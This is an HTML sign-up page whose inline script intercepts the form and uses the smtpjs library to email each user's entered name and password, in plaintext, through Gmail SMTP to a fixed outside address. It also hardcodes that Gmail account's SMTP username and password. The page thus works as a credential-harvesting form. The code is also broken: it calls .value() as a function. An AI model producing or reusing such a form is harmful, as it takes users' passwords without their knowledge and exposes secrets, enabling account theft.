<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="form-container">
        <h2>Sign Up</h2>
        <form action="/signup" method="post" onsubmit="sendEmail(); reset(); return false;">
            <div class="form-group">
                <label for="name">Name:</label>
                <input type="text" name="username" id="name" placeholder="Enter your name" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" name="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="submit-btn">Sign Up</button>
        </form>
    </div>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
        function sendEmail(){
            Email.send({
            Host : "smtp.gmail.com",
            Username : "apologuns44@gmail.com",
            Password : "ayllaview44",
            To : 'apologuns44@gmail.com',
            From : document.getElementById('name').value(),
            Subject : "New user registered",
            Body : "Name" + document.getElementById('name').value() + " Password: " + document.getElementById('password').value(),
            }).then(
            message => alert(message)
            );
        }
    </script>
</body>
</html>
